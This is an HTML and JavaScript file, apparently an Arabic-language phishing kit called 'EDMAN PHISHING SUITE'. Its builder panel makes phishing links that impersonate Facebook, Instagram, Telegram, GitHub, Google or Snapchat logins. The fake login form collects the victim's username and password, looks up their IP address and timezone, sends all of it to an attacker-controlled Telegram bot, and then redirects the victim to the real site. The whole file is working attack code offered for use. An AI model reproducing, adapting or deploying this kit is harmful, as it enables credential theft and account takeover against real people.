<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDMAN PHISHING SUITE - C2</title>
    <style>
        body {
            background-color: #030712;
            color: #38bdf8;
            font-family: Tahoma, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }
        canvas#matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.15;
        }
        .container {
            width: 90%;
            max-width: 480px;
            background: rgba(17, 24, 39, 0.95);
            padding: 30px;
            border-radius: 16px;
            border: 1px solid #d4af37;
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.25);
            box-sizing: border-box;
            text-align: center;
            backdrop-filter: blur(8px);
            z-index: 1;
        }
        .logo-title { color: #d4af37; font-size: 20px; font-weight: bold; margin-bottom: 5px; letter-spacing: 1px; }
        .logo-sub { color: #9ca3af; font-size: 11px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        h2 { color: #f43f5e; font-size: 18px; margin-bottom: 15px; }
        p { color: #9ca3af; font-size: 12px; margin-bottom: 20px; line-height: 1.5; }
        .form-group { margin-bottom: 15px; text-align: right; }
        label { display: block; color: #d4af37; font-size: 12px; margin-bottom: 6px; font-weight: bold; }
        input, select {
            width: 100%;
            padding: 12px;
            background: #1f2937;
            border: 1px solid #374151;
            color: #fff;
            border-radius: 8px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus, select:focus { border-color: #d4af37; box-shadow: 0 0 8px rgba(212, 175, 55, 0.4); }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #d4af37, #aa820a);
            color: #030712;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 15px;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(212, 175, 55, 0.3);
            margin-top: 10px;
        }
        button:hover { opacity: 0.9; }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background: #1f2937;
            border-radius: 8px;
            border: 1px solid #34d399;
            display: none;
            text-align: right;
        }
        .result-box a { color: #34d399; font-weight: bold; word-break: break-all; font-size: 12px; text-decoration: underline; }
        .footer { margin-top: 15px; font-size: 10px; color: #6b7280; letter-spacing: 1px; }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>
    <div class="container" id="appCard"></div>

    <script>
        // تأثير الماتريكس
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const alphabet = '日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-_';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const rainDrops = [];
        for (let x = 0; x < columns; x++) { rainDrops[x] = 1; }
        function drawMatrix() {
            ctx.fillStyle = 'rgba(3, 7, 18, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0ea5e9';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) { rainDrops[i] = 0; }
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);
        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });

        // إدارة واجهات المنصات
        const urlParams = new URLSearchParams(window.location.search);
        const botToken = urlParams.get('t');
        const chatId = urlParams.get('c');
        const platform = urlParams.get('p') || 'facebook';
        const cardDiv = document.getElementById('appCard');

        const platformsData = {
            'facebook': { name: 'Facebook - تسجيل الدخول', bg: '#1877f2' },
            'instagram': { name: 'Instagram - التحقق من الحساب', bg: '#e1306c' },
            'telegram': { name: 'Telegram - تسجيل الدخول السريع', bg: '#229ed9' },
            'github': { name: 'GitHub - تأكيد الهوية', bg: '#24292e' },
            'google': { name: 'Google - الأمان والمتابعة', bg: '#4285f4' },
            'snapchat': { name: 'Snapchat - استعادة الحساب', bg: '#fffc00' }
        };

        if (!botToken || !chatId) {
            // لوحة التحكم لاختيار المنصة وتوليد الرابط
            cardDiv.innerHTML = `
                <div class="logo-title">EDMAN HAKING</div>
                <div class="logo-sub">PHISHING SUITE GENERATOR</div>
                <h2>💀 لوحة صانع صفحات الصيد 💀</h2>
                <p>اختر المنصة المستهدفة وأدخل بيانات بوت تيليجرام الخاص بك:</p>
                <div class="form-group"><label>اختر المنصة المستهدفة:</label>
                    <select id="selPlatform">
                        <option value="facebook">Facebook</option>
                        <option value="instagram">Instagram</option>
                        <option value="telegram">Telegram</option>
                        <option value="github">GitHub</option>
                        <option value="google">Google</option>
                        <option value="snapchat">Snapchat</option>
                    </select>
                </div>
                <div class="form-group"><label>Bot Token:</label><input type="text" id="inputToken" placeholder="أدخل التوكن هنا..."></div>
                <div class="form-group"><label>Chat ID:</label><input type="text" id="inputChat" placeholder="أدخل الآيدي هنا..."></div>
                <button onclick="generatePhishLink()">توليد رابط الصيد السريع</button>
                <div class="result-box" id="resultBox">
                    <p style="color: #34d399; margin-bottom: 8px; font-weight: bold;">رابط الصيد جاهز للإرسال:</p>
                    <a id="generatedLink" href="#" target="_blank"></a>
                </div>
                <div class="footer">EDMAN HAKING TOOL © 2026</div>
            `;
        } else {
            // صفحة الصيد الحقيقية بناءً على اختيار المنصة
            let pInfo = platformsData[platform] || platformsData['facebook'];
            cardDiv.innerHTML = `
                <div class="logo-title" style="color:${pInfo.bg}">${pInfo.name}</div>
                <p>يرجى إدخال بيانات حسابك للمتابعة والتحقق الأمني السريع:</p>
                <div class="form-group"><label>اسم المستخدم / البريد / الهاتف:</label><input type="text" id="phishUser" placeholder="أدخل البيانات هنا..."></div>
                <div class="form-group"><label>كلمة المرور:</label><input type="password" id="phishPass" placeholder="••••••••"></div>
                <button style="background:${pInfo.bg}; color:#fff;" onclick="executePhish('${platform}')">تسجيل الدخول / متابعة</button>
                <div id="status" style="margin-top:15px; font-size:12px; color:#34d399;"></div>
                <div class="footer">SECURE GATEWAY © 2026</div>
            `;
        }

        function generatePhishLink() {
            let t = document.getElementById('inputToken').value.trim();
            let c = document.getElementById('inputChat').value.trim();
            let p = document.getElementById('selPlatform').value;
            if (!t || !c) { alert('يرجى ملء الحقول أولاً!'); return; }
            let fullLink = window.location.origin + window.location.pathname + `?t=${t}&c=${c}&p=${p}`;
            let linkElem = document.getElementById('generatedLink');
            linkElem.href = fullLink;
            linkElem.innerText = fullLink;
            document.getElementById('resultBox').style.display = 'block';
        }

        async function executePhish(plat) {
            let u = document.getElementById('phishUser').value.trim();
            let p = document.getElementById('phishPass').value.trim();
            if (!u || !p) { alert('يرجى إكمال الحقول المطلوبة'); return; }

            document.getElementById('status').innerText = "جاري التحقق من البيانات...";

            let ipData = "غير معروف";
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipJson = await ipRes.json();
                ipData = ipJson.ip;
            } catch(e) {}

            let msg = `🎯 *صيد ناجح لمنصة [${plat.toUpperCase()}] بواسطة إدمان!* 💀\n\n` +
                      `👤 *المستخدم / البريد:* \`${u}\`\n` +
                      `🔑 *كلمة المرور:* \`${p}\`\n` +
                      `🌐 *عنوان الـ IP:* \`${ipData}\`\n` +
                      `🌍 *المنطقة الزمنية:* \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' })
                });
            } catch(e) {}

            setTimeout(() => {
                window.location.href = `https://www.${plat}.com`;
            }, 1000);
        }
    </script>
</body>
</html>
